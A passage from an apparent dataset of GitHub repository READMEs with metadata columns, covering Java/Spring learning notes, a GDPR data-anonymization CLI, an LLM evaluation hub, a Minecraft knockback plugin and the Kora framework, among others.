}
```

11. protected
El modificador protected permite el acceso al miembro al que se aplica desde otras clases en el mismo paquete y también desde subclases, independientemente de si están en el mismo paquete o no.

Ejemplo:
```
public class MiClase {
    protected int miVariableProtegida;
    protected void miMetodoProtegido() {
        // Código del método
    }
}
```

12. default (o sin modificador)
Si no se especifica ningún modificador (también conocido como ""modificador de paquete""), el miembro es accesible solo dentro del mismo paquete. Esto significa que cualquier clase dentro del mismo paquete puede acceder al miembro, pero las clases fuera del paquete no pueden.

Ejemplo:

```
class MiClase {
    int miVariableDePaquete;
    void miMetodoDePaquete() {
        // Código del método
    }
}
```


----
## Datos interesantes:

### application.properties en Spring Boot:

El archivo application.properties es un archivo de configuración en Spring Boot que se utiliza para definir propiedades específicas de la aplicación. Aquí puedes configurar cosas como la base de datos que la aplicación utilizará, el puerto en el que se ejecutará la aplicación, configuraciones de seguridad, entre otras. Es una forma de personalizar el comportamiento de tu aplicación sin necesidad de cambiar el código fuente.

### JPA (Java Persistence API):

JPA es una API de Java que proporciona un conjunto de especificaciones para trabajar con bases de datos relacionales en aplicaciones Java. Permite a los desarrolladores mapear objetos Java a tablas en una base de datos relacional y viceversa, simplificando el proceso de interactuar con la base de datos. Con JPA, puedes realizar operaciones CRUD (Crear, Leer, Actualizar y Eliminar) en la base de datos de manera más sencilla y utilizando objetos Java.

### Hibernate:

Hibernate es un framework de mapeo objeto-relacional (ORM) para Java. Se utiliza comúnmente junto con JPA para implementar las especificaciones de JPA de manera eficiente. Hibernate simplifica el desarrollo de aplicaciones Java al proporcionar una capa de abstracción sobre la base de datos subyacente, permitiendo a los desarrolladores interactuar con la base de datos utilizando objetos Java en lugar de consultas SQL directas. Esto hace que el desarrollo de aplicaciones que requieren acceso a bases de datos sea más rápido y menos propenso a errores.


### En resumen: 

Mientras que JPA es una especificación estándar para mapear objetos Java a bases de datos relacionales, Hibernate es una implementación popular de esta especificación que simplifica el desarrollo de aplicaciones Java al proporcionar funcionalidades ORM.


## Profesor: Alejandro Daniel Di Stefano
",0,0,1,MIT
apple/pkl-spring,main,,2,2,3,Apache-2.0
JECT-Study/PICK-O-Server,main,"<div align=""center"">

![image](https://github.com/user-attachments/assets/d39ad443-8b06-4fc3-88e0-fd601245b08d)

# [PICK-O 🎯](https://slashpage.com/ject/dk58wg2ej8719mnqevxz?full=true)
함께 선택하고 즐기는 밸런스게임 플랫폼, PICK-O

</div>

## 🙋🏻 소개
> 개발 기간: 24.02 ~ 진행중

소셜 엔터테인먼트 서비스의 일종으로, 유저들의 소통과 트렌드 파악을 돕는 스토리텔링형 밸런스게임 플랫폼 서비스예요.    
유저들이 직접 자신의 고민을 투표와 함께 업로드하는 커뮤니티 타입의 ‘톡픽’과 가볍게 즐길 수 있는 게임 타입의 ‘밸런스게임’ 으로 구성되어 있어요. 

## 🛠️ 기술 스택
### 백엔드
<img width=""700"" src=""https://github.com/CHZZK-Study/Balance-Talk-Backend/assets/110653660/6d2a14ef-92bb-4021-967c-4c8b58939be8"">

### 인프라
<img width=""700"" src=""https://github.com/CHZZK-Study/Balance-Talk-Backend/assets/110653660/cd69ce13-c775-44a1-a3fe-6846985e14e8"">

## 🧱 아키텍처
<img width=""800"" src=""https://github.com/CHZZK-Study/Balance-Talk-Backend/assets/110653660/f4f1f902-4197-422b-8286-c9923212f0d4"">

## 👨‍👩‍👧‍👦 팀원
|                                         Backend (PL)                                         |                                         Backend                                          |                                         Backend                                          |                                       Frontend                                        |                                        Frontend                                         |                                        Frontend                                        |                                        Frontend                                        |
| :--------------------------------------------------------------------------------------: | :--------------------------------------------------------------------------------------: | :--------------------------------------------------------------------------------------: | :-----------------------------------------------------------------------------------: | :-------------------------------------------------------------------------------------: | :------------------------------------------------------------------------------------: | :------------------------------------------------------------------------------------: |
| <img src=""https://avatars.githubusercontent.com/u/110653660?v=4"" width=400px alt=""한재모""/> | <img src=""https://avatars.githubusercontent.com/u/73704053?v=4"" width=400px alt=""왕효준""/> | <img src=""https://avatars.githubusercontent.com/u/78118588?v=4"" width=400px alt=""최준수""/> | <img src=""https://avatars.githubusercontent.com/u/94692566?v=4"" width=400px alt=""한아름""/> | <img src=""https://avatars.githubusercontent.com/u/84820008?v=4"" width=400px alt=""유희선""/> | <img src=""https://avatars.githubusercontent.com/u/101927445?v=4"" width=400px alt=""김원준""/> | <img src=""https://avatars.githubusercontent.com/u/135022491?v=4"" width=400px alt=""서유빈""/> |
|                       [한재모](https://github.com/Hanjaemo)                        |                            [왕효준](https://github.com/gywns0417)                            |                            [최준수](https://github.com/junslog)                            |                         [한아름](https://github.com/areumH)                         |                          [유희선](https://github.com/hsgh085)                           |                            [김원준](https://github.com/WonJuneKim)                            |                          [서유빈](https://github.com/alwubin)                           |
",0,10,16,
navinreddy20/spring6-course,main,,0,0,1,
igor-pcholkin/DataAnonymization,main,"# Data Anonymization

 <!-- TOC -->
* [Data Anonymization](#data-anonymization)
    * [What is the data anonymization application?](#what-is-the-data-anonymization-application)
    * [What is a sensitive data?](#what-is-a-sensitive-data)
    * [Why sensitive data should be kept secure?](#why-sensitive-data-should-be-kept-secure)
    * [Anonymization approach](#anonymization-approach)
    * [How does the application work?](#how-does-the-application-work)
    * [What anonymizers are available?](#what-anonymizers-are-available)
    * [Setup](#setup)
    * [Configuration](#configuration)
    * [How to add a custom anonymizer](#how-to-add-a-custom-anonymizer)
    * [Autodetection of senstitive data](#autodetection-of-senstitive-data)
    * [Running the application](#running-the-application)
    * [Use cases](#use-cases)
    * [Introduction video](#introduction-video)
    * [Reference Documentation](#reference-documentation)
<!-- TOC -->

### What is the data anonymization application? 

The data anonymization application is a command-line tool designed to safeguard sensitive data. 
It achieves this by masking of the sensitive data within an enterprise's relational database.
The anonymization reduces risk of unintended disclosure of the sensitive data while still keeping it useful for
business processing. The European Union's General Data Protection Regulation (GDPR) requires that stored data 
on people in the EU undergo either anonymization or a pseudonymization process.

### What is a sensitive data? 

Sensitive information is whatever data that can be linked or attributed to a specific person, company or client.
Examples of sensitive information include data about customers: company name, names of official representatives,
phones, emails, addresses, credit cards, birth dates, medical information.

### Why sensitive data should be kept secure?

Securing sensitive data is crucial for every digital business. 
When sensitive information about customers is leaked to the public, it can result in direct and indirect 
losses for the company, including reputational and financial damage.

### Anonymization approach

In the data protection application, anonymization is accomplished through a data masking approach.
This technique involves replacing sensitive values, such as personal identification numbers, credit card numbers, social security numbers, 
and email addresses, with fictitious or randomized values. 
Importantly, this process ensures that the structure and, potentially, the semantic meaning of the data are preserved while safeguarding its confidentiality..

### How does the application work?

The dataprotection application retrieves data from a relational database, performs anonymization on it, 
and writes it back to the database. 
Anonymization is done according to rules specified in a transformation configuration file. 
The transformation configuration file outlines which specific columns in the database schema and 
tables should be anonymized, as well as how - as identified by identifier of anonymizer to use.

### What anonymizers are available?

Currently, the following anonymizers are available, with the possibility of additional ones being introduced in the future.
Displayed on the left is the ID of each anonymizer, which should be specified in the transformation YAML file. 

**name** - the anonymizer replaces alphabetic letters with random alternatives while preserving the initial letters<br/>
**email** - changes email address to a randomly looking one<br/>
**address** - the anonymizer that obfuscates however preserves the appearance of addresses by maintaining spaces and punctuation marks while obscuring the underlying data<br/>
**birthdate** - the date anonymizer generates a new random date, effectively changing the original date<br/>
**ccard** - the credit card anonymizer replaces credit card numbers with randomly generated ones<br/>
**pid** - a basic ""one-size-fits-all"" anonymizer capable of handling various personal identification codes, social security numbers, and tax payer numbers<br/>
**post** - the post code anonymizer replaces post codes with alternative values sourced from the same column in the database<br/>
**ip** - the ip address anonymizer replaces ip address with another random ip address<br/>

### Setup

This is a console application which requires Java 19 (which should be downloaded and setup separately).
After java 19 is installed, set JAVA_HOME to the corresponding folder, e.g.  

`export JAVA_HOME=~/.jdks/corretto-19.0.2`

The application can be built using `mvnw package` command run in the project folder.

It will build zip packages for windows and linux and place it into `target` folder.
After unpacking one of the packages you should be able to run the `dp.sh` script with arguments as shown below.

### Configuration

* **conf/application.properties** file should be used to set up DB connection URL and credentials.
  This (the only) DB will be used for anonymization and data analysis. <br/>
* **AnonymizerTable.java** - (optionally) for registering a custom anonymizer <br/>
* **columnToAnonymizer.properties** (optionally) - the file is used when adding new anonymizer and using it for auto-detection of columns
  in database for anonymization.

### How to add a custom anonymizer

* Add a new anonymizer class (with test) to com.discreet.dataprotection.anonymizer package. Extend it either from BaseAnonymizer or CharSequenceAnonymizer.
* Register the anonymizer class with corresponding alias in AnonymizerTable.java
* Use anonymizer alias as a value mapped to db column in transformations.yaml file.
* (Optionally) for using anonymizer in auto-detection process, map it to corresponding column name in columnToAnonymizer.properties

### Autodetection of senstitive data

The application autonomously identifies which database columns are suitable for anonymization by leveraging metadata information about the database. 
This information can be provided in two ways: through a Data Definition Language (DDL) file containing statements used to create data tables in a database schema, or via a direct connection to the database schema.

### Running the application

Application can be started used supplied script: dp.bat for windows or dp.sh for Linux or MacOS.
The application requires Java 19 (or newer version), which should be installed separately.
Upon execution without arguments, the application provides information about available command line arguments. 
At the moment the application works in 2 modes: ""transform"" and ""detect"", each represented by corresponding 
command and related options:

* **transform** </br>
  _anonymize database_ 
  * -tfn, --transformationsFileName=[transformationsFileName] </br>
  _yaml file describing for each schema/table how each column should be anonymized_
* **detect** </br>
  _auto detect what schema tables and columns in a given columns can be anonymized. The result is a temporary 
transformations.yaml file which can be later used with ""transform"" command._
  * -dbe, --dbEngine=[dbEngine] </br>
  _one of mysql, oracle, postgresql, db2, jtds, sybase, sqlserver, mariadb, derby, hive, h2, informix_
  * -dsn, --defaultSchemaName=[defaultSchemaName] </br>
  _name to use in case if schema name is missing in DDL schema_
  * -iid, --ignoreMissingIds </br>
  _ignore db tables with missing or not detected id columns_
  * -sfn, --schemaFileName=[schemaFileName] </br>
  _ddl schema file name to use for auto-detection of DB table columns which can be anonymized_
  * -sn, --schemaName=[schemaName] </br>
  _schema name to use for reading metadata from DB and auto-detection of DB table columns which can be anonymized_

### Use cases

**1a.** Auto-detect data eligible for anonymization using supplied DDL schema file:

`./dp.sh detect -dbe mysql -dsn test -sfn schema.sql -iid`

- it will automatically identify database columns in the schema that likely require anonymization. 
Subsequently, it will generate a transformation.yaml file, which can be further refined through post-processing (manual editing) and subsequently utilized for actual anonymization. 
It's important to note that at this stage, no data in the database schema is altered.
-dbe argument is used to supply db dialect. -iid is an optional, yet recommended, option that enables the application to ignore errors and continue processing if it fails to automatically detect the ID column for a specific database table. 
Without this option, the application will generate an error and halt the autodetection process.

or:<br/>
**1b.** Auto-detect data eligible for anonymization using supplied schema name. 

`./dp.sh detect -sn test`

- In this step, the application behaves similarly to the previous one, but instead of relying on a DDL file, it loads schema metadata directly from the database. 
This approach is useful when a DDL file is unavailable. 
- In the provided example, ""test"" represents the name of the schema to be analyzed in the database as defined in the application.properties file.

**1c.** Generate transformation.yaml file manually using transformations.yaml.example as an example using the following pattern:

[schema name]&#58;<br/>
&nbsp;&nbsp;[db table name]:<br/>
&nbsp;&nbsp;&nbsp;&nbsp;anonymizers:<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[column name]: [anonymizer id]<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;...<br/>
&nbsp;&nbsp;...<br/>

**2.** Use the generated file transformation.yaml for actual anonymization of the selected schema:

`./dp.sh transform -tfn transformations.yaml`

### Introduction video

https://www.youtube.com/watch?v=88a57qXoT08&t=2s

### Reference Documentation
For further reference, please consider the following links:

* [General Data Protection Regulation](https://gdpr-info.eu/)
* [Health Insurance Portability and Accountability Act](https://en.wikipedia.org/wiki/Health_Insurance_Portability_and_Accountability_Act)
",1,0,1,
Enndfp/short-link,main,,0,0,1,MIT
sameh-tarek/Fawry-Internship,main,"# Fawry Full Stack Engineering Internship

<details>
  <summary>Click to view Fawry image</summary>
  
  ![Fawry](https://github.com/user-attachments/assets/0c4189f6-cdea-4a4f-984a-90a2520f661c)
  
</details>


## About 

This repository serves as a record of the resources and tasks I'm working on during my internship at [Fawry](https://www.fawry.com/). My focus is on mastering full-stack development using **Spring Boot** and **Angular**. By documenting my learning journey, I hope to keep things organized and make it easier for others to access valuable knowledge. I believe that the content shared here will benefit anyone interested in full-stack development and contribute to the broader learning community.

## Table of Contents

| Week         | Content                                              |
|--------------|------------------------------------------------------|
| 01           | [Week 01](./Week01#readme)                           |
| 02           | [Week 02](./Week02#readme)                           |
| 03           | [Week 03](./Week03#readme)                           |
| 04           | [Week 04](./Week04#readme)                           |
| 05           | [Week 05](./Week05#readme)                           |
| 06           | [Week 06](./Week06#readme)                           |
| Final Project| [Final Project](https://github.com/Fawry-Internship)  |

## Exploration Tips
- Explore the weekly sections to find detailed insights and resources for each phase of the internship. 🕵️‍♂️
- The resources shared include articles, videos, and documentation that I personally found useful for learning full-stack development. 📚


<details>
  <summary>Some Memorable pictures</summary>
  
  ![IMG-20240419-WA0031](https://github.com/user-attachments/assets/d4c6f53f-c781-4557-b2a2-b681dab0a01c)
  ![1714424120186](https://github.com/user-attachments/assets/4320e0df-a27b-4c0a-bc6c-dc53ce23e0de)

</details>
",0,0,2,
ageerle/ruoyi-ai,main,"## 平台简介

> 基于ruoyi-plus实现AI聊天和绘画功能-后端

> 本项目完全开源免费！
后台管理界面使用elementUI服务端使用Java17+SpringBoot3.X

实现功能
1. 支持ChatGPT4,Dall-E-3,ChatGPT-4-All,GPTS 模型
2. 支持语音克隆
3. 支持文生图模型
4. 支持微信小程序
5. 支持个人二维码实时到账(易支付)
6. 支持个人微信接入ChatGPT
> 
>项目地址
<ul>
<li>小程序端: https://github.com/ageerle/ruoyi-uniapp</li>
<li>前端-后台管理: https://github.com/ageerle/ruoyi-admin</li>
<li>前端-用户端: https://github.com/ageerle/ruoyi-web</li>
<li>演示地址: https://web.pandarobot.chat</li>
</ul>

## 小程序演示
<div>
  <img style=""margin:10px"" src=""./image/03.png"" alt=""drawing"" width=""300px"" height=""400px""/>
  <img style=""margin:10px"" src=""./image/04.png"" alt=""drawing"" width=""300px"" height=""400px""/>
</div>

## H5演示
<div>
  <img style=""margin:10px"" src=""./image/05.png"" alt=""drawing"" width=""300px"" height=""400px""/>
  <img style=""margin:10px"" src=""./image/06.png"" alt=""drawing"" width=""300px"" height=""400px""/>
</div>

## PC端演示
<div>
  <img style=""margin-top:10px"" src=""./image/07.png"" alt=""drawing"" width=""550px"" height=""300px""/>
  <img style=""margin-top:10px"" src=""./image/08.png"" alt=""drawing"" width=""550px"" height=""300px""/>
</div>

## MJ绘图
<div>
  <img style=""margin-top:10px"" src=""./image/10.png"" alt=""drawing"" width=""550px"" height=""300px""/>
  <img style=""margin-top:10px"" src=""./image/11.png"" alt=""drawing"" width=""550px"" height=""300px""/>
</div>

## 私有知识库管理
<div>
  <img style=""margin-top:10px;width:50%"" src=""./image/12.png"" alt=""drawing"" width=""550px"" height=""300px""/>
  <img style=""margin-top:10px;width:50%"" src=""./image/私有知识库业务架构图.drawio.png"" alt=""drawing"" width=""550px"" height=""300px""/>
</div>

## 进群学习
<div>
  <img src=""./image/01.png"" alt=""drawing"" width=""300px"" height=""300px""/>
</div>

## 参考项目
<ol>
<li>https://github.com/Grt1228/chatgpt-java</li>
<li>https://github.com/Dooy/chatgpt-web-midjourn
",0,4,1,MIT
DomainDrivers/dd-java,main,,0,0,1,GPL-3.0
LSOIVNE/Giffgaff-Hook,master,,1,2,1,
joshlong/bootiful-spring-boot-2024,main,,0,1,2,Apache-2.0
Enndfp/simple-framework,main,"<img src=""https://img.enndfp.cn/202401181958108.png"" style=""zoom:80%;""/>

**简体中文** | [English](README-EN.md) 

<div align=""center"">
<h1>🌟 SimpleFramework</h1>
</div>

<div align=""center"">
<b>🛠️ 造轮子项目：从头实现Spring框架</b>
</div>
<div align=""center"">
<img src=""https://img.shields.io/badge/Java-1.8-orange""/>
<img src=""https://img.shields.io/badge/CGLIB-3.3.0-green""/>
<img src=""https://img.shields.io/badge/AspectJWeaver-1.9.5-yellowgreen""/>
<img src=""https://img.shields.io/badge/javax.servlet.jsp--api-2.3.3-blue""/>
<img src=""https://img.shields.io/badge/javax.servlet--api-4.0.1-lightgrey""/>
<img src=""https://img.shields.io/badge/Gson-2.8.6-yellow""/>
<img src=""https://img.shields.io/badge/Slf4j--log4j12-1.7.28-yellow""/>
<img src=""https://img.shields.io/badge/Lombok-1.18.30-blue""/>
</div>



## 📖 项目简介

> Spring框架在Java开发界占据了举足轻重的地位，这主要归功于其易于理解和功能强大的特性。它广泛应用了多种设计模式，为项目提供了规范化的架构。更重要的是，Spring作为一个开源框架，为广大开发者提供了学习和提升的机会，为Java开发带来了一种革新的春风。
>
> 鉴于Spring的这些优势，很多Java开发者渴望使用基础技术来实现一个类似于Spring的框架。这种做法不仅是对Spring架构和设计理念的深入理解，也是一种技术能力的展示。因此，“simple-framework”项目应运而生，旨在通过实现一个简化版的Spring框架，使开发者更容易地理解其核心概念，同时也能够提升自己在Java开发领域的技术水平。

**Simple-Framework是一个免费的开源项目，面向所有个人和企业，提供易于使用和学习的Java开发框架，支持开发者社区的共同进步与创新。**

## 🚀 技术亮点

- **Java 1.8**: 提供优化的性能和稳定性，是Java开发的基石。
- **CGLIB 3.3.0 & AspectJWeaver 1.9.5**: 强大的库，为AOP提供了坚实的基础。
- **Java Servlet API & Gson & Lombok**: 这些技术共同构成了一个强大的Web应用开发环境。

## 📚 项目架构图

### 🔄 IOC

![image-20240118205412786](https://img.enndfp.cn/202401182054883.png)

### 🔀 AOP

![image-20240119133233090](https://img.enndfp.cn/202401191332233.png)

### 🕸️ MVC

![image-20240119142136722](https://img.enndfp.cn/202401191421810.png)

## ✨ 主要功能

本项目是一个**简易版本的Spring框架**，实现了Spring框架的三大核心功能：**IOC**（控制反转）、**AOP**（面向切面编程）和**MVC**（模型-视图-控制器），并将其分为以下核心包：

#### 📦 Core包

**功能**: Core包实现了框架的**核心功能**，包括**Bean的扫描加载**、**容器的维护**、**单例模式的实现**，以及**自定义Bean的处理**。

**实现方式**: 利用**Java反射机制**动态扫描和加载指定包下的类，识别并处理不同类型的注解（如 `@Component`, `@Controller` 等）以管理不同种类的Bean。同时，它实现了**单例模式**，确保每个Bean只被实例化一次，并提供了操作Bean的基本方法，例如添加、获取和管理Bean实例。

#### 💉 Inject包

**功能**: Inject包负责**依赖注入**，包括处理 `@Autowired` 注解，实现**单例模式下的依赖注入**，以及为**接口注入实现类**。

**实现方式**: 通过**Java反射机制**扫描Bean的字段，查找带有 `@Autowired` 注解的字段，并利用Bean容器获取并注入所需依赖。它支持单例模式下的依赖注入，确保依赖的一致性和唯一性。同时，它也能为接口动态地注入适当的实现类，提高了代码的灵活性和可维护性。

#### 🔍 AOP包

**功能**: AOP包遵循**面向切面编程思想**，使用 `Aspect` 和 `Order` 注解来标识和排序切面类，通过**CGlib动态代理**和**AspectJWeaver**实现横切逻辑的织入，动态修改方法逻辑。

**实现方式**: 利用**CGlib**创建目标类的代理，并通过实现 `MethodInterceptor` 接口来拦截方法调用。这允许在方法执行前后执行切面逻辑（如日志记录、权限检查等）。同时，通过**AspectJ**的表达式语言提供对被代理类更精细的控制，使得可以根据不同的需要对方法逻辑进行修改和增强。

#### 🌐 MVC包

**功能**: MVC包处理**请求分发相关功能**，包括重构 `DispatcherServlet`，实现 `RequestProcessorChain` 和 `RequestProcessor` 矩阵，以及 `ResultRender` 矩阵，完成多种请求的处理与响应渲染。

**实现方式**: 通过 `DispatcherServlet` 作为**中心控制器**，处理所有的HTTP请求并将其分发到相应的处理器。利用 `RequestProcessorChain` 管理和执行一系列请求处理器，以处理不同类型的请求（如静态资源、控制器方法等）。`ResultRender` 矩阵负责根据处理结果选择合适的渲染策略，例如渲染HTML页面或返回JSON数据，确保响应正确地渲染和返回给客户端。

## 💡 快速上手指南

要开始使用 **SimpleFramework**，您可以采取以下步骤：

### 📥 方法一：源码使用

1. 克隆仓库：

   ```bash
   git clone https://github.com/Enndfp/simple-framework.git
   ```

2. 导入项目到您的IDE（例如IntelliJ IDEA）。

3. 在 `demo` 目录下进行相关测试。这与使用Spring Boot开发项目类似。

### 📦 方法二：War包部署

1. 构建项目并生成War包。
2. 将War包部署到您的Servlet容器中，如Apache Tomcat。
3. 启动容器，应用将自动部署。

### 🌟 示例代码

以下是一个简单的示例，展示了如何在您的项目中使用 **SimpleFramework**：

```java
import com.simpleframework.core.BeanContainer;

public class MyApplication {
    public static void main(String[] args) {
        // 初始化容器
        BeanContainer container = BeanContainer.getInstance();
        container.loadBeans(""com.yourpackage"");

        // 使用容器获取Bean
        MyService myService = (MyService) container.getBean(MyService.class);
        myService.doSomething();
    }
}
```

在这个例子中，我们首先获取了 `BeanContainer` 的实例，然后加载了指定包路径下的所有Bean。之后，我们从容器中获取了 `MyService` 类的实例，并调用了其方法。
",0,0,1,MIT
Apress/ChatGPT-for-Java,main,"# Apress Source Code

This repository accompanies [*ChatGPT for Java*](https://www.link.springer.com/book/10.1007/979-8-8688-0116-7) by Bruce Hopkins (Apress, 2024).

[comment]: #cover
![Cover image](979-8-8688-0115-0.jpg)

Download the files as a zip using the green button, or clone the repository to your machine using Git.

## Releases

Release v1.0 corresponds to the code in the published book, without corrections or updates.

## Contributions

See the file Contributing.md for more information on how you can contribute to this repository.",1,0,1,NOASSERTION
Minecraft-LightLand/Youkai-Homecoming,main,# Youkai-Homecoming,0,1,3,LGPL-2.1
xielong/ai-hub,main,"# AI Hub Project

## 简介

AI Hub旨在持续测试和评估主流大型语言模型，同时积累和管理各种有效的模型调用提示（prompt）。目前，AI Hub已接入国内所有主流的大型语言模型，包括文心一言、腾讯混元、智谱AI、MiniMax、百川智能等，并计划持续追踪、接入和评估新模型。

已支持模型列表：
1. OpenAI / gpt-4-turbo
2. OpenAI / gpt-3.5-turbo
3. Baidu / ERNIE-Bot-4（文心一言4）
4. Baidu / ERNIE-Bot-turbo（文心一言）
5. Zhipu / glm-4（智谱GLM-4）
6. Zhipu / chatGLM_turbo（智谱chatGLM）
7. Ali / qwen-plus（通义千问plus）
8. Ali / qwen-turbo（通义千问）
9. Tencent / ChatPro（腾讯混元）
10. Tencent / ChatStd（腾讯混元）
11. Tencent / hunyuan-lite（腾讯混元)
12. Baichuan / Baichuan2-Turbo（百川）
13. Minimax / abab5.5-chat（MiniMax）
14. Minimax / abab6-chat（MiniMax）
15. Xunfei / Spark3.1（讯飞星火）
16. Moonshot / moonshot-v1-8k (月之暗面)
17. Xunfei / Spark3.5 (讯飞星火3.5)
18. ByteDance / Skylark-chat (字节豆包)
19. Lingyi / yi-34b-chat-0205 (零一万物)
20. Lingyi / yi-34b-chat-200k (零一万物)
21. Lingyi / yi-vl-plus (零一万物)
22. Deepseek / DeepSeek-V2 (Deepseek)
23. Baidu / ERNIE-Lite-8K（文心一言）
24. Baidu / ERNIE-Speed-8K（文心一言）
25. Xunfei / Spark-Lite（讯飞星火）

在 [大模型列表](#大模型列表) 部分，有更完整的大语言模型列表。请注意，其中的一些大语言模型尚未经过评估，我将陆续对这些模型进行评估。


![chat-demo](assets/chat-demo.png)

使用前请在 Settings 页面设置模型的 credentials：
![settings](assets/settings.png)

## 评估结果
### 英文翻译
[测试用例看这里](docs/use_cases/translation/)
![英文翻译](assets/assess_translation.png)

### 编程
[测试用例看这里](docs/use_cases/coding/)
![英文翻译](assets/assess_coding.png)

### 指令输出
[测试用例看这里](docs/use_cases/instruction/)
![英文翻译](assets/assess_instruction.png)


## 大模型接入
如果你想自己接入列表中的大模型，可以通过以下方式。
### Rest 服务
启动 ai-hub-server，访问
```http
http://127.0.0.1:3000/api/v1/models/${provider}/${model}:chat
```
Post:
```json
{
    ""input"": ""${input}""
}
```
### Java 代码接入
可以参考[这里](ai-hub-server/src/main/java/com/github/xielong/aihub/adapter)
```java
@Service
public class AIModelInvokerFactory {

    private final ApplicationContext context;

    @Autowired
    public AIModelInvokerFactory(ApplicationContext context) {
        this.context = context;
    }

    public AIModelInvoker getProviderAdapter(String providerName) {
        AIProvider provider = AIProvider.fromName(providerName);

        switch (provider) {
            case OPENAI:
                return context.getBean(OpenAIInvoker.class);
            case BAICHUAN:
                return context.getBean(BaichuanInvoker.class);
            case ALI:
                return context.getBean(AliInvoker.class);
            case BAIDU:
                return context.getBean(BaiduInvoker.class);
            case ZHIPU:
                return context.getBean(ZhipuInvoker.class);
            case TENCENT:
                return context.getBean(TencentInvoker.class);
            case XUNFEI:
                return context.getBean(XunfeiInvoker.class);
            case MINIMAX:
                return context.getBean(MiniMaxInvoker.class);
            default:
                throw new IllegalArgumentException(""Unknown provider: "" + provider);
        }
    }

}

```

## 运行

### Docker
推荐使用 docker-compose 启动服务
```shell
cd docker
docker-compose up -d
```

### 数据库
参考[脚本](docker/init-db/init.sql)

### 前端
```shell
cd ai-hub-fe
npm run start
```

### 服务端
需要 JDK 11 以上版本
```shell
cd ai-hub-server
mvn clean package
java -jar ai-hub-server-1.0.0-SNAPSHOT-exec.jar
```

## 测试集

### [翻译](docs/use_cases/translation/)
### [编程](docs/use_cases/coding/)
### z-bench 测试集

## 大模型列表

### 低成本模型

| Company   | Model          | Price(1M tokens)    | Context Length |
|-----------|----------------|---------------------|----------------|
| Baidu     | ERNIE Speed    | 免费                | 8k             |
| Baidu     | ERNIE Lite     | 免费                | 8k             |
| Tencent   | hunyuan-lite   | 免费                | 256k           |
| ByteDance | Doubao-lite    | Input: 0.3 \| Output: 0.6 | 32k     |
| Zhipu     | GLM-3-Turbo    | 1                   | 128k           |
| Lingyi    | yi-spark       | 1                   | 16k            |
| Ali       | qwen-long      | Input: 0.5 \| Output: 2 | 10m      |
| ByteDance | Doubao-pro     | Input: 0.8 \| Output: 2 | 32k     |
| DeepSeek  | deepseek-chat  | Input: 1 \| Output: 2  | 32k     |
| Lingyi    | yi-medium      | 2.5                 | 16k            |

### 中低成本模型

| Company   | Model          | Price(1M tokens)    | Context Length |
|-----------|----------------|---------------------|----------------|
| Ali       | qwen-turbo     | Input: 2 \| Output: 6  | 8k          |
| Tencent   | hunyuan-standard | Input: 4.5 \| Output: 5 | 32k    |
| MiniMax   | abab5.5s       | 5                   | 8k             |
| OpenAI    | GPT-3.5 Turbo  | Input: $0.50 \| Output: $1.50 | 16k |
| ByteDance | Doubao-pro-128k | Input: 5 \| Output: 9 | 128k   |
| Baichuan  | Baichuan2-Turbo | 8                  | 32k            |
| MiniMax   | abab6.5s       | 10                  | 245k           |
| Ali       | qwen-plus      | Input: 4 \| Output: 12 | 32k     |
| Baidu     | ERNIE 3.0      | 12                  | 8k             |
| Baichuan  | Baichuan3-Turbo | 12                 | 32k            |
| Lingyi    | yi-large-turbo | 12                  | 16k            |
| Lingyi    | yi-medium-200k | 12                  | 200k           |
| Moonshot  | moonshot-v1-8k | 12                  | 8k             |

### 中高成本模型

| Company   | Model              | Price(1M tokens)    | Context Length |
|-----------|--------------------|---------------------|----------------|
| Moonshot  | moonshot-v1-32k    | 24                  | 32k            |
| Baichuan  | Baichuan3-Turbo-128k | 24                | 128k           |
| MiniMax   | abab6.5            | 30                  | 8k             |
| Tencent   | hunyuan-standard-256k | Input: 15 \| Output: 60 | 256k |
| Moonshot  | moonshot-v1-128k   | 60                  | 128k           |

### 高成本模型

| Company   | Model              | Price(1M tokens)    | Context Length |
|-----------|--------------------|---------------------|----------------|
| OpenAI    | GPT-4o             | Input: $5 \| Output: $15 | 128k     |
| Baidu     | ERNIE-3.5-128k     | Input: 48 \| Output: 96 | 128k     |
| Tencent   | hunyuan-pro        | Input: 30 \| Output: 100 | 32k     |
| Ali       | qwen-max           | Input: 40 \| Output: 120 | 8k      |
| Zhipu     | GLM-4              | 100                 | 128k           |
| Baichuan  | Baichuan4          | 100                 | 32k            |
| Baidu     | ERNIE 4.0          | 120                 | 8k             |",0,1,1,Apache-2.0
CASELOAD7000/knockback-sync,main,"Minecraft doesn’t factor in network latency when determining a player's actions on the server.
This causes the server to receive outdated information that doesn’t reflect the player's clientside position.
As a result, players take negative velocity when they're on the ground clientside, but not serverside.

This plugin handles knockback as if it were calculated clientside, ensuring that no player is at a disadvantage,
regardless of their own or their opponent’s connection.

Showcase: https://www.youtube.com/watch?v=SVokpr3v-TA

Official Discord: https://discord.gg/nnpqpAtyVW

## Frequently Asked Questions (FAQ)

### Does this change put high ping players at a disadvantage?
**It depends on the player.** Some may notice a difference if they're used to relying on high ping to reduce knockback. For others, it could actually be an advantage.

### How does this change benefit high ping players?
**Knockback control.** For example, it will be easier to escape crit chains and punish crit.

### Why was the configurability of ping offset removed?
**It promotes consistency across all servers.** Extensive testing with top players has shown that an offset of 25 provides a balanced experience for everyone.

### How do I change the ping offset?
**You must run a modified build of KnockbackSync.** The variable can be changed inside of the [PlayerData](src/main/java/me/caseload/knockbacksync/manager/PlayerData.java) class.

## License
GNU General Public License v3.0 or later

See [COPYING](COPYING) to see the full text.
",3,3,9,GPL-3.0
kora-projects/kora,master,"# Kora Framework

[![Maven Central](https://maven-badges.herokuapp.com/maven-central/ru.tinkoff.kora/common/badge.svg)](https://maven-badges.herokuapp.com/maven-central/ru.tinkoff.kora/common)
[![GitHub Action](https://github.com/kora-projects/kora/workflows/Build%20Master/badge.svg)](https://github.com/kora-projects/kora/actions?query=workflow%3A%22Build%20Master%22++)

Kora - полнофункциональный фреймворк общего назначения для написания серверных Java / Kotlin приложений с упором на Производительность, Эффективность, Прозрачность.
Kora стремится предоставить достаточно высокоуровневые декларативные инструменты и абстракции для разработчиков,
которые на этапе компиляции преобразуются в производительный для железа и понятный для человека код. [Хотите знать больше?](https://kora-projects.github.io/kora-docs/ru/)

---

Kora is a full-stack framework for writing Java / Kotlin server-side applications with a focus on Performance, Efficiency, Transparency.
Kora aims to provide sufficiently high-level declarative tools and abstractions for developers,
